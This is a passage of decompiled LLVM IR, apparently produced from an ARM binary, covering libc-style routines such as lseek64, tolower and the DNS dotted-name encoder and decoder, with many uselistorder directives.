  uselistorder i32 %v0_19734, { 1, 0 }
  uselistorder i32 %v0_196f8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_196dc, { 1, 0 }
  uselistorder i32 %v0_196a8, { 1, 0, 2 }
  uselistorder i32 %v0_1969c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_19698, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 11, 17, 12, 13, 14, 15, 16, 0, 18, 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 21, 22, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 4, 8, 9, 19, 10, 18, 11, 12, 20, 0, 1, 2, 5, 6, 7, 14, 16, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 13, 4, 7, 8, 9, 0, 10, 1, 11, 12, 2, 3, 5, 6, 14 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 7, 2, 3, 0, 8, 9, 6, 1, 4, 10, 5 }
  uselistorder i32 (i8*)* @__GI_fclose, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 0, 3 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 31, 32, 33, 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32 7, { 2, 21, 22, 11, 12, 13, 0, 17, 25, 19, 1, 3, 4, 5, 18, 20, 8, 14, 15, 6, 7, 16, 10, 9, 23, 24 }
  uselistorder i32* @global_var_2c58c, { 0, 6, 2, 7, 1, 3, 4, 8, 5, 9 }
  uselistorder i32 35, { 0, 2, 3, 4, 1 }
  uselistorder i32 10, { 3, 4, 38, 5, 6, 39, 40, 41, 42, 43, 30, 14, 29, 7, 44, 1, 45, 46, 47, 48, 12, 15, 33, 16, 34, 17, 18, 19, 0, 31, 32, 20, 27, 28, 35, 9, 21, 13, 36, 37, 11, 10, 2, 49, 50, 22, 8, 24, 25, 23, 26, 51 }
  uselistorder i32 12, { 49, 50, 51, 0, 52, 7, 53, 19, 12, 13, 3, 56, 14, 10, 73, 74, 75, 76, 77, 78, 11, 79, 80, 81, 82, 83, 84, 15, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 5, 4, 41, 42, 43, 16, 20, 48, 65, 21, 22, 67, 68, 69, 1, 23, 70, 8, 71, 9, 24, 2, 72, 17, 57, 58, 59, 60, 85, 6, 44, 54, 55, 25, 26, 27, 28, 29, 30, 45, 46, 47, 61, 62, 63, 18, 64, 66 }
  uselistorder i32* @sb, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 1, 2, 24, 25, 26, 27, 28, 29, 30, 31, 32, 3, 4, 33, 34, 35, 36, 37, 38, 5, 6, 7, 8, 9, 10, 0, 11 }
  uselistorder i32 80, { 0, 2, 3, 4, 1, 5, 6 }
  uselistorder i32 48, { 15, 5, 18, 2, 10, 11, 12, 3, 6, 13, 7, 20, 17, 14, 1, 0, 16, 19, 8, 9, 4 }
  uselistorder i32 36, { 10, 11, 12, 14, 15, 16, 17, 4, 1, 13, 0, 7, 8, 9, 2, 3, 5, 18, 6 }
  uselistorder i32 56, { 6, 5, 8, 3, 9, 4, 2, 0, 10, 7, 11, 1 }
  uselistorder i32 44, { 11, 12, 13, 9, 10, 18, 1, 8, 17, 15, 0, 14, 2, 3, 4, 5, 6, 16, 7 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32 -32, { 1, 5, 2, 6, 7, 3, 0, 4 }
  uselistorder i32 32, { 61, 62, 63, 0, 64, 65, 41, 73, 75, 30, 31, 27, 47, 35, 48, 49, 44, 45, 4, 3, 6, 5, 8, 7, 1, 28, 68, 66, 67, 50, 19, 51, 2, 36, 52, 53, 54, 55, 56, 20, 57, 42, 43, 69, 70, 71, 72, 76, 37, 46, 38, 29, 58, 59, 60, 10, 9, 21, 32, 39, 74, 22, 12, 11, 14, 13, 23, 16, 15, 24, 25, 18, 17, 26, 33, 34, 40 }
  uselistorder i32* @fp, { 40, 43, 41, 1, 42, 44, 45, 46, 47, 0, 49, 48, 50, 51, 52, 12, 2, 53, 54, 55, 56, 57, 58, 59, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 113, 114, 112, 107, 108, 109, 110, 111 }
  uselistorder i32* @sl, { 21, 22, 23, 24, 27, 25, 26, 28, 29, 30, 31, 32, 33, 34, 2, 3, 35, 36, 0, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 4, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 5, 6, 7, 8, 9, 10, 11, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* @r8, { 36, 37, 38, 39, 40, 41, 42, 5, 6, 7, 43, 48, 49, 0, 50, 85, 86, 87, 88, 1, 89, 90, 91, 92, 23, 24, 100, 101, 8, 9, 10, 11, 12, 13, 14, 99, 93, 94, 95, 96, 97, 98, 25, 26, 27, 28, 29, 30, 31, 3, 4, 21, 22, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 2, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 32, 33, 34, 35, 44, 45, 46, 47, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* @r7, { 68, 70, 71, 69, 72, 73, 74, 75, 76, 77, 9, 10, 11, 12, 13, 14, 15, 1, 78, 86, 85, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 45, 46, 47, 48, 119, 16, 17, 2, 18, 6, 19, 20, 21, 22, 23, 24, 25, 26, 27, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 49, 50, 51, 52, 28, 29, 30, 31, 87, 3, 88, 89, 4, 5, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 0, 7, 8, 43, 44, 117, 118, 64, 65, 66, 67, 79, 80, 81, 82, 83, 84, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder label %dec_label_pc_199a0, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1999c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1996c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_19968, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1990c, { 1, 0 }
  uselistorder label %dec_label_pc_198b8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19858.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19898, { 1, 0 }
  uselistorder label %dec_label_pc_19814, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_196c8, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_199f4, label %dec_label_pc_199e0

dec_label_pc_199e0:                               ; preds = %entry
  %v0_199e0 = call i32 @__errno_location()
  %v0_199e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_199e4 = sub i32 0, %v0_199e4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_199ec = inttoptr i32 %v0_199e0 to i32*
  store i32 %v1_199e4, i32* %v2_199ec, align 4
  %v0_199fc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_199fc

dec_label_pc_199f4:                               ; preds = %entry
  %v2_199f4 = icmp eq i32 %arg1, 0
  br i1 %v2_199f4, label %dec_label_pc_19a08, label %dec_label_pc_199fc

dec_label_pc_199fc:                               ; preds = %dec_label_pc_199f4, %dec_label_pc_199e0
  %v0_199fc = phi i32 [ %arg1, %dec_label_pc_199f4 ], [ %v0_199fc.pre, %dec_label_pc_199e0 ]
  br label %dec_label_pc_19a0c

dec_label_pc_19a08:                               ; preds = %dec_label_pc_199f4
  br label %dec_label_pc_19a0c

dec_label_pc_19a0c:                               ; preds = %dec_label_pc_199fc, %dec_label_pc_19a08
  %v14_19a10 = phi i32 [ %v0_199fc, %dec_label_pc_199fc ], [ %tmp9, %dec_label_pc_19a08 ]
  ret i32 %v14_19a10

; uselistorder directives
  uselistorder i32 ()* @__errno_location, { 58, 47, 72, 71, 70, 46, 45, 57, 56, 44, 17, 41, 37, 36, 26, 50, 4, 3, 2, 1, 23, 0, 22, 73, 53, 52, 60, 59, 69, 68, 67, 16, 51, 25, 40, 39, 49, 15, 29, 32, 61, 31, 38, 35, 55, 54, 5, 43, 42, 14, 48, 11, 10, 66, 28, 27, 65, 21, 9, 13, 6, 20, 12, 64, 63, 33, 19, 18, 62, 8, 7, 34, 30, 24 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_19a0c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19a1c = icmp slt i32 %arg1, 0
  br i1 %v1_19a1c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_19a1c = mul i32 %arg1, 2
  %v2_19a28 = load i32, i32* bitcast (i32** @global_var_2c8c8.1116 to i32*), align 4
  %v2_19a2c = add i32 %v2_19a28, %v2_19a1c
  %v3_19a30 = inttoptr i32 %v2_19a2c to i8*
  %v4_19a30 = load i8, i8* %v3_19a30, align 1
  %v6_19a30 = zext i8 %v4_19a30 to i32
  %v1_19a34 = add i32 %v2_19a2c, 1
  %v2_19a34 = inttoptr i32 %v1_19a34 to i8*
  %v3_19a34 = load i8, i8* %v2_19a34, align 1
  %v4_19a34 = zext i8 %v3_19a34 to i32
  %v3_19a38 = mul nuw i32 %v4_19a34, 16777216
  %v4_19a3c = sdiv i32 %v3_19a38, 65536
  %v5_19a3c = or i32 %v4_19a3c, %v6_19a30
  ret i32 %v5_19a3c

; uselistorder directives
  uselistorder i32 %v2_19a2c, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_19a48 = load i32, i32* @r4, align 4
  store i32 %v3_19a48, i32* %stack_var_-24, align 4
  %v6_19a48 = load i32, i32* @r5, align 4
  %v9_19a48 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_19a50 = load i32, i32* @r1, align 4
  store i32 %v0_19a50, i32* @r6, align 4
  %v0_19a54 = load i32, i32* @r2, align 4
  store i32 %v0_19a54, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_19abc19 = icmp slt i8* %arg1, null
  store i1 %v1_19abc19, i1* %cpsr_n.global-to-local, align 1
  %v2_19abc20 = icmp eq i8* %arg1, null
  store i1 %v2_19abc20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19abc20, label %dec_label_pc_19ad4, label %dec_label_pc_19ac8

dec_label_pc_19a60:                               ; preds = %dec_label_pc_19ac8
  %v2_19a60 = call i32 @__GI_strchr(i32 %v0_19a6021, i32 46)
  store i32 %v2_19a60, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_19a64 = icmp slt i32 %v2_19a60, 0
  store i1 %v1_19a64, i1* %cpsr_n.global-to-local, align 1
  %v2_19a64 = icmp eq i32 %v2_19a60, 0
  store i1 %v2_19a64, i1* %cpsr_z.global-to-local, align 1
  %v0_19a68 = load i32, i32* @r4, align 4
  %v2_19a68 = sub i32 %v2_19a60, %v0_19a68
  store i32 %v2_19a68, i32* %ip.global-to-local, align 4
  store i32 %v0_19a68, i32* %r0.global-to-local, align 4
  br i1 %v2_19a64, label %dec_label_pc_19a74, label %dec_label_pc_19a7c

dec_label_pc_19a74:                               ; preds = %dec_label_pc_19a60
  %v1_19a6c = inttoptr i32 %v0_19a68 to i8*
  %v3_19a74 = call i32 @strlen(i8* %v1_19a6c)
  store i32 %v3_19a74, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_19a74, 16777216
  %v1_19a78 = sdiv i32 %sext, 16777216
  store i32 %v1_19a78, i32* %ip.global-to-local, align 4
  %v0_19a88.pre = load i32, i32* @r4, align 4
  %v0_19a98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19a7c

dec_label_pc_19a7c:                               ; preds = %dec_label_pc_19a60, %dec_label_pc_19a74
  %v0_19a98 = phi i32 [ %v2_19a60, %dec_label_pc_19a60 ], [ %v0_19a98.pre, %dec_label_pc_19a74 ]
  %v0_19a88 = phi i32 [ %v0_19a68, %dec_label_pc_19a60 ], [ %v0_19a88.pre, %dec_label_pc_19a74 ]
  %v0_19aa8 = phi i32 [ %v2_19a68, %dec_label_pc_19a60 ], [ %v1_19a78, %dec_label_pc_19a74 ]
  %v0_19a7c = load i32, i32* %r7.global-to-local, align 4
  %v1_19a7c = add i32 %v0_19a7c, 1
  store i32 %v1_19a7c, i32* @lr, align 4
  %v1_19a80 = load i32, i32* %r8.global-to-local, align 4
  %v2_19a80 = sub i32 %v1_19a80, %v0_19a7c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_19a84 = icmp slt i32 %v0_19aa8, 0
  store i1 %v1_19a84, i1* %cpsr_n.global-to-local, align 1
  %v2_19a84 = icmp eq i32 %v0_19aa8, 0
  store i1 %v2_19a84, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_19a88, i32* @r1, align 4
  %v0_19a8c = load i32, i32* @r6, align 4
  %v2_19a8c = add i32 %v0_19a8c, %v1_19a7c
  store i32 %v2_19a8c, i32* @r0, align 4
  store i32 %v0_19aa8, i32* @r2, align 4
  %v1_19a94 = add i32 %v2_19a80, -1
  %v1_19a98 = add i32 %v0_19a98, 1
  store i32 %v1_19a98, i32* @r4, align 4
  br i1 %v2_19a84, label %.loopexit, label %dec_label_pc_19aa0

dec_label_pc_19aa0:                               ; preds = %dec_label_pc_19a7c
  %v2_19aa0 = sub i32 %v0_19aa8, %v1_19a94
  %v3_19aa0 = icmp ult i32 %v0_19aa8, %v1_19a94
  %v4_19aa0 = xor i32 %v1_19a94, %v0_19aa8
  %v5_19aa0 = xor i32 %v2_19aa0, %v0_19aa8
  %v6_19aa0 = and i32 %v5_19aa0, %v4_19aa0
  %v7_19aa0 = icmp slt i32 %v6_19aa0, 0
  store i1 %v7_19aa0, i1* %cpsr_v.global-to-local, align 1
  %v8_19aa0 = icmp slt i32 %v2_19aa0, 0
  store i1 %v8_19aa0, i1* %cpsr_n.global-to-local, align 1
  %v9_19aa0 = icmp eq i32 %v0_19aa8, %v1_19a94
  store i1 %v9_19aa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19aa0, label %dec_label_pc_19aa8, label %.loopexit

dec_label_pc_19aa8:                               ; preds = %dec_label_pc_19aa0
  %v1_19aa8 = trunc i32 %v0_19aa8 to i8
  %v4_19aa8 = add i32 %v0_19a8c, %v0_19a7c
  %v5_19aa8 = inttoptr i32 %v4_19aa8 to i8*
  store i8 %v1_19aa8, i8* %v5_19aa8, align 1
  %v0_19aac = load i32, i32* @lr, align 4
  %v1_19aac = load i32, i32* %ip.global-to-local, align 4
  %v2_19aac = add i32 %v1_19aac, %v0_19aac
  store i32 %v2_19aac, i32* %r7.global-to-local, align 4
  %v0_19ab0 = call i32 @memcpy()
  store i32 %v0_19ab0, i32* %r0.global-to-local, align 4
  %v0_19ab4 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_19ab4 = icmp slt i32 %v0_19ab4, 0
  store i1 %v1_19ab4, i1* %cpsr_n.global-to-local, align 1
  %v2_19ab4 = icmp eq i32 %v0_19ab4, 0
  store i1 %v2_19ab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19ab4, label %dec_label_pc_19ad4, label %dec_label_pc_19aa8.dec_label_pc_19abc_crit_edge

dec_label_pc_19aa8.dec_label_pc_19abc_crit_edge:  ; preds = %dec_label_pc_19aa8
  %v0_19abc.pre = load i32, i32* @r4, align 4
  store i32 %v0_19abc.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_19abc = icmp slt i32 %v0_19abc.pre, 0
  store i1 %v1_19abc, i1* %cpsr_n.global-to-local, align 1
  %v2_19abc = icmp eq i32 %v0_19abc.pre, 0
  store i1 %v2_19abc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19abc, label %dec_label_pc_19ad4, label %dec_label_pc_19ac8

dec_label_pc_19ac8:                               ; preds = %entry, %dec_label_pc_19aa8.dec_label_pc_19abc_crit_edge
  %v0_19a6021 = phi i32 [ %v0_19abc.pre, %dec_label_pc_19aa8.dec_label_pc_19abc_crit_edge ], [ %tmp, %entry ]
  %v1_19ac8 = inttoptr i32 %v0_19a6021 to i8*
  %v2_19ac8 = load i8, i8* %v1_19ac8, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_19acc = icmp eq i8 %v2_19ac8, 0
  store i1 %v2_19acc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19acc, label %dec_label_pc_19ad4, label %dec_label_pc_19a60

dec_label_pc_19ad4:                               ; preds = %dec_label_pc_19aa8.dec_label_pc_19abc_crit_edge, %dec_label_pc_19aa8, %dec_label_pc_19ac8, %entry
  %v0_19ad4 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_19ad4 = icmp slt i32 %v0_19ad4, 0
  store i1 %v1_19ad4, i1* %cpsr_n.global-to-local, align 1
  %v2_19ad4 = icmp eq i32 %v0_19ad4, 0
  store i1 %v2_19ad4, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_19ad4, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_19ad4
  %v5_19adc = load i32, i32* %r7.global-to-local, align 4
  %v6_19adc = add i32 %v5_19adc, 1
  store i32 %v6_19adc, i32* %r0.global-to-local, align 4
  %v7_19ae0 = load i32, i32* @r6, align 4
  %v9_19ae0 = add i32 %v7_19ae0, %v5_19adc
  %v10_19ae0 = inttoptr i32 %v9_19ae0 to i8*
  store i8 0, i8* %v10_19ae0, align 1
  %v0_19ae4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_19ae4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_19ae4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_19ad4, %bb
  %v2_19ae4 = phi i1 [ %v2_19ae4.pre, %bb ], [ false, %dec_label_pc_19ad4 ]
  %v1_19ae4 = phi i1 [ %v1_19ae4.pre, %bb ], [ %v1_19ad4, %dec_label_pc_19ad4 ]
  %v0_19ae4 = phi i1 [ %v0_19ae4.pre, %bb ], [ %v2_19ad4, %dec_label_pc_19ad4 ]
  %v3_19ae4 = xor i1 %v2_19ae4, %v1_19ae4
  %v4_19ae4 = or i1 %v0_19ae4, %v3_19ae4
  br i1 %v4_19ae4, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_19ae4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_19ae4, i32* @r4, align 4
  store i32 %v6_19a48, i32* @r5, align 4
  store i32 %v9_19a48, i32* @r6, align 4
  %v25_19ae4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_19ae4

.loopexit:                                        ; preds = %dec_label_pc_19aa0, %dec_label_pc_19a7c, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_19aec = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_19aec, i32* @r4, align 4
  store i32 %v6_19a48, i32* @r5, align 4
  store i32 %v9_19a48, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_19ad4, { 0, 2, 1 }
  uselistorder i32 %v0_19abc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_19ab4, { 1, 0 }
  uselistorder i32 %v2_19aa0, { 1, 0 }
  uselistorder i32 %v1_19a94, { 2, 0, 3, 1 }
  uselistorder i32 %v0_19aa8, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_19a78, { 1, 0 }
  uselistorder i32 %v0_19a68, { 0, 2, 1, 3 }
  uselistorder i1 %v2_19abc20, { 1, 0 }
  uselistorder i32 %v9_19a48, { 1, 0 }
  uselistorder i32 %v6_19a48, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 7, 2, 6, 3, 5, 4, 8, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 36, 34, 37, 35, 40, 38, 41, 39, 43, 42, 45, 44, 47, 46, 49, 48 }
  uselistorder i32 (i8*)* @strlen, { 12, 27, 26, 11, 10, 9, 17, 16, 28, 25, 24, 23, 21, 22, 20, 19, 18, 15, 14, 13, 30, 29, 8, 7, 6, 1, 4, 5, 3, 2, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 46, { 0, 5, 6, 1, 7, 2, 3, 4 }
  uselistorder i32* @r6, { 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 11, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 1, 0, 17, 18, 19, 20, 21, 138, 2, 139, 140, 141, 142, 143, 144, 145, 53, 3, 54, 55, 56, 146, 150, 149, 151, 152, 153, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 4, 70, 71, 72, 73, 74, 75, 76, 211, 216, 102, 103, 22, 23, 24, 104, 105, 106, 107, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 208, 209, 210, 182, 183, 5, 184, 185, 186, 187, 188, 189, 193, 13, 194, 195, 6, 77, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 78, 79, 80, 81, 82, 83, 84, 85, 154, 155, 156, 157, 158, 7, 12, 159, 35, 8, 36, 37, 160, 9, 161, 162, 86, 87, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 14, 15, 16, 88, 89, 90, 91, 51, 52, 212, 213, 214, 215, 163, 164, 165, 166, 10, 167, 168, 169, 170, 147, 148, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 190, 191, 192 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_19ad4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_19ac8, { 1, 0 }
  uselistorder label %dec_label_pc_19a7c, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_19af0 = load i32, i32* @r4, align 4
  %v6_19af0 = load i32, i32* @r5, align 4
  %v0_19af4 = load i32, i32* @r0, align 4
  store i32 %v0_19af4, i32* %sl.global-to-local, align 4
  %v2_19af4 = icmp eq i32 %v0_19af4, 0
  br i1 %v2_19af4, label %.thread16, label %dec_label_pc_19b94.preheader

.thread16:                                        ; preds = %entry
  %v0_19b001 = load i32, i32* @r2, align 4
  store i32 %v0_19b001, i32* %sb.global-to-local, align 4
  %v0_19b042 = load i32, i32* @r3, align 4
  store i32 %v0_19b042, i32* %stack_var_-40, align 4
  br label %dec_label_pc_19bb4

dec_label_pc_19b94.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_19b00 = load i32, i32* @r2, align 4
  store i32 %v0_19b00, i32* %sb.global-to-local, align 4
  %v0_19b04 = load i32, i32* @r3, align 4
  store i32 %v0_19b04, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_19b943952 = load i32, i32* @r1, align 4
  %v2_19b944053 = add i32 %v1_19b943952, %v0_19af4
  %v3_19b944154 = inttoptr i32 %v2_19b944053 to i8*
  %v4_19b944255 = load i8, i8* %v3_19b944154, align 1
  %v6_19b944356 = zext i8 %v4_19b944255 to i32
  store i32 %v6_19b944356, i32* @r4, align 4
  %v2_19b984457 = icmp eq i8 %v4_19b944255, 0
  br i1 %v2_19b984457, label %bb35, label %dec_label_pc_19b18.lr.ph

dec_label_pc_19b18:                               ; preds = %dec_label_pc_19b18.lr.ph, %bb30
  %v2_19ba050 = phi i1 [ %v2_19ba04663, %dec_label_pc_19b18.lr.ph ], [ true, %bb30 ]
  %v6_19b9448 = phi i32 [ %v6_19b944361, %dec_label_pc_19b18.lr.ph ], [ %v6_19b94, %bb30 ]
  %v1_19b9447 = phi i32 [ %v1_19b943960, %dec_label_pc_19b18.lr.ph ], [ %v5_19b40, %bb30 ]
  %v1_19b1c = and i32 %v6_19b9448, 192
  br i1 %v2_19ba050, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_19b18
  %v1_19b20 = load i32, i32* %r8.global-to-local, align 4
  %v2_19b20 = add i32 %v1_19b20, 1
  store i32 %v2_19b20, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_19b18, %bb
  %v2_19b24 = icmp eq i32 %v1_19b1c, 192
  %v1_19b28 = add i32 %v1_19b9447, 1
  store i32 %v1_19b28, i32* @r5, align 4
  br i1 %v2_19b24, label %dec_label_pc_19b30, label %dec_label_pc_19b50

dec_label_pc_19b30:                               ; preds = %bb28
  %v2_19b30 = add i32 %v1_19b28, %v0_19b30.ph59
  %v3_19b30 = inttoptr i32 %v2_19b30 to i8*
  %v4_19b30 = load i8, i8* %v3_19b30, align 1
  %v6_19b30 = zext i8 %v4_19b30 to i32
  %v1_19b38 = urem i32 %v6_19b9448, 64
  br i1 %v2_19ba050, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_19b30
  %v1_19b3c = load i32, i32* %r8.global-to-local, align 4
  %v2_19b3c = add i32 %v1_19b3c, 1
  store i32 %v2_19b3c, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_19b30, %bb29
  %v4_19b40 = mul nuw nsw i32 %v1_19b38, 256
  %v5_19b40 = or i32 %v6_19b30, %v4_19b40
  store i32 %v5_19b40, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_19b94 = add i32 %v5_19b40, %v0_19b30.ph59
  %v3_19b94 = inttoptr i32 %v2_19b94 to i8*
  %v4_19b94 = load i8, i8* %v3_19b94, align 1
  %v6_19b94 = zext i8 %v4_19b94 to i32
  store i32 %v6_19b94, i32* @r4, align 4
  %v2_19b98 = icmp eq i8 %v4_19b94, 0
  br i1 %v2_19b98, label %dec_label_pc_19ba0.bb36_crit_edge, label %dec_label_pc_19b18

